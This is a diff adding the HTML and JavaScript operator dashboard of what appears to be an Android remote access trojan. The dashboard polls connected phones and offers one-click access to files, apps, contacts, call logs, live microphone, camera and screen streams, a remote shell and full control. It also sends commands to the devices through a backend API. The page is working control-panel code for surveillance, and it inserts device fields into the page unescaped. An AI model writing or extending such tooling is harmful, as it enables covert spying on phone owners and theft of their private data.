@@ -1,0 +1,133 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Remote Access Admin</title>
+    <style>
+        body {
+            font-family: 'Segoe UI', sans-serif;
+            background: #1a1a1a;
+            color: #fff;
+            padding: 20px;
+        }
+
+        .device-card {
+            background: #333;
+            padding: 15px;
+            margin: 10px 0;
+            border-radius: 8px;
+            border-left: 5px solid #00ff00;
+        }
+
+        .device-card h3 {
+            margin: 0 0 10px;
+            color: #00ff00;
+        }
+
+        .actions button {
+            background: #444;
+            color: white;
+            border: none;
+            padding: 8px 12px;
+            margin-right: 5px;
+            cursor: pointer;
+            border-radius: 4px;
+        }
+
+        .actions button:hover {
+            background: #555;
+        }
+
+        #log {
+            margin-top: 20px;
+            background: #000;
+            padding: 10px;
+            height: 150px;
+            overflow-y: auto;
+            font-family: monospace;
+            border: 1px solid #333;
+        }
+    </style>
+</head>
+
+<body>
+    <h1>Connected Devices</h1>
+    <div id="device-list">Loading...</div>
+
+    <h3>Event Log</h3>
+    <div id="log"></div>
+
+    <script>
+        async function fetchDevices() {
+            try {
+                const res = await fetch('/api/devices');
+                const devices = await res.json();
+                renderDevices(devices);
+            } catch (e) {
+                console.error(e);
+            }
+        }
+
+        function renderDevices(devices) {
+            const list = document.getElementById('device-list');
+            list.innerHTML = '';
+            if (devices.length === 0) list.innerHTML = '<p>No devices connected.</p>';
+
+            devices.forEach(d => {
+                const div = document.createElement('div');
+                div.className = 'device-card';
+
+                // Navigation Helper
+                const nav = (page) => `window.location.href='${page}?id=${d.id}'`;
+
+                div.innerHTML = `
+                    <h3>${d.model} (${d.id})</h3>
+                    <p>Battery: ${d.batteryLevel}% | Android: ${d.androidVersion}</p>
+                    <div class="actions">
+                        <button onclick="${nav('device-info.html')}" style="background:#2196F3">ℹ Info</button>
+                        <button onclick="${nav('file-manager.html')}" style="background:#FF9800">📂 Files</button>
+                        <button onclick="${nav('apps.html')}" style="background:#9C27B0">📱 Apps</button>
+                        <button onclick="${nav('contacts.html')}" style="background:#E91E63">👤 Contacts</button>
+                        <button onclick="${nav('call-logs.html')}" style="background:#3F51B5">📞 Calls</button>
+                        <br><br>
+                        <button onclick="${nav('mic-stream.html')}" style="background:#F44336">🎙 Mic</button>
+                        <button onclick="${nav('cam-stream.html')}" style="background:#F44336">📸 Cam</button>
+                        <button onclick="${nav('screen-stream.html')}" style="background:#F44336">🖥 Screen</button>
+                        <button onclick="${nav('shell.html')}" style="background:#607D8B">💻 Shell</button>
+                        <button onclick="${nav('control.html')}" style="background:#795548">🎮 Control</button>
+                    </div>
+                `;
+                list.appendChild(div);
+            });
+        }
+
+        async function sendCommand(deviceId, action, payload) {
+            log(`Serving command: ${action} to ${deviceId}`);
+            try {
+                const res = await fetch('/api/command', {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ deviceId, action, payload })
+                });
+                const data = await res.json();
+                log(`Result: ${JSON.stringify(data)}`);
+            } catch (e) {
+                log(`Error: ${e.message}`);
+            }
+        }
+
+        function log(msg) {
+            const el = document.getElementById('log');
+            const time = new Date().toLocaleTimeString();
+            el.innerHTML += `<div>[${time}] ${msg}</div>`;
+            el.scrollTop = el.scrollHeight;
+        }
+
+        setInterval(fetchDevices, 2000);
+        fetchDevices();
+    </script>
+</body>
+
+</html>
